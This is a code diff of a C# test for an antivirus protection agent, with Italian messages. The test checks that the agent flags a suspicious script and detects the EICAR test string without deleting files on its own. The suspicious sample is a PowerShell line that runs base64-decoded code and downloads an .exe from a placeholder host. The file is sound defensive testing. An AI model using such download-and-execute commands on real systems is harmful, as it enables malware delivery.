@@ -1,9 +1,8 @@
+using System.Text;
 using FFGuardian.Engine10;
 
 internal static class Program
 {
-    // Famiglia di rilevamento prevista dallo scanner per gli script: Heuristic.Suspicious.Script.
-    // Il test verifica il comportamento e non dipende dal nome esatto, che può evolvere.
     private static async Task<int> Main()
     {
         string root = Path.Combine(Path.GetTempPath(), "FFGuardian-Agent-" + Guid.NewGuid().ToString("N"));
@@ -31,6 +30,8 @@ internal static class Program
             await using AutonomousProtectionAgent10 agent = new(engine, options);
             TaskCompletionSource<ProtectionAgentEvent10> suspiciousScanned =
                 new(TaskCreationOptions.RunContinuationsAsynchronously);
+            TaskCompletionSource<ProtectionAgentEvent10> eicarDetected =
+                new(TaskCreationOptions.RunContinuationsAsynchronously);
 
             agent.Activity += (_, e) =>
             {
@@ -40,11 +41,18 @@ internal static class Program
                 {
                     suspiciousScanned.TrySetResult(e);
                 }
+
+                if (e.EventType == "ThreatDetected" &&
+                    e.Path.EndsWith("eicar.com.txt", StringComparison.OrdinalIgnoreCase) &&
+                    e.ScanResult is not null)
+                {
+                    eicarDetected.TrySetResult(e);
+                }
             };
 
             agent.Start();
             Ensure(agent.IsRunning, "L'agente non risulta avviato.");
-            Ensure(agent.MonitoredFolderCount == 1, "La cartella di test non è monitorata.");
+            Ensure(agent.MonitoredFolderCount >= 1, "La cartella di test non è monitorata.");
 
             string ignored = Path.Combine(monitored, "readme.txt");
             await File.WriteAllTextAsync(ignored, "harmless text");
@@ -61,14 +69,31 @@ internal static class Program
                 "Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QQ=='))); " +
                 "Invoke-WebRequest 'https://example.invalid/file' -OutFile $env:TEMP+'\\x.exe'");
 
-            ProtectionAgentEvent10 result = await suspiciousScanned.Task.WaitAsync(TimeSpan.FromSeconds(20));
-            FileScanResult10 scanResult = result.ScanResult
+            ProtectionAgentEvent10 suspiciousEvent =
+                await suspiciousScanned.Task.WaitAsync(TimeSpan.FromSeconds(20));
+            FileScanResult10 suspiciousResult = suspiciousEvent.ScanResult
                 ?? throw new InvalidOperationException("Risultato scansione automatica mancante.");
 
-            Ensure(scanResult.Verdict is ThreatVerdict10.Suspicious or ThreatVerdict10.Malicious,
-                $"Lo script doveva risultare almeno sospetto, ottenuto: {scanResult.Verdict}.");
-            Ensure(scanResult.Confidence > 0, "La scansione automatica non ha prodotto un punteggio.");
+            Ensure(suspiciousResult.Verdict is ThreatVerdict10.Suspicious or ThreatVerdict10.Malicious,
+                $"Lo script doveva risultare almeno sospetto, ottenuto: {suspiciousResult.Verdict}.");
+            Ensure(suspiciousResult.Confidence > 0, "La scansione automatica non ha prodotto un punteggio.");
             Ensure(File.Exists(suspicious), "L'agente non deve applicare remediation automatica.");
+
+            string eicarPath = Path.Combine(monitored, "eicar.com.txt");
+            string eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+            await File.WriteAllTextAsync(eicarPath, eicar, Encoding.ASCII);
+
+            ProtectionAgentEvent10 threatEvent =
+                await eicarDetected.Task.WaitAsync(TimeSpan.FromSeconds(20));
+            FileScanResult10 threatResult = threatEvent.ScanResult
+                ?? throw new InvalidOperationException("Risultato EICAR in tempo reale mancante.");
+
+            Ensure(threatResult.Verdict == ThreatVerdict10.Malicious,
+                $"EICAR doveva risultare malevolo, ottenuto: {threatResult.Verdict}.");
+            Ensure(threatResult.DetectionName == "Test.EICAR",
+                "Il rilevamento EICAR in tempo reale non usa il nome previsto.");
+            Ensure(File.Exists(eicarPath),
+                "La protezione in tempo reale non deve eliminare automaticamente il file senza conferma.");
 
             await agent.StopAsync();
             Ensure(!agent.IsRunning, "L'agente non si è arrestato correttamente.");
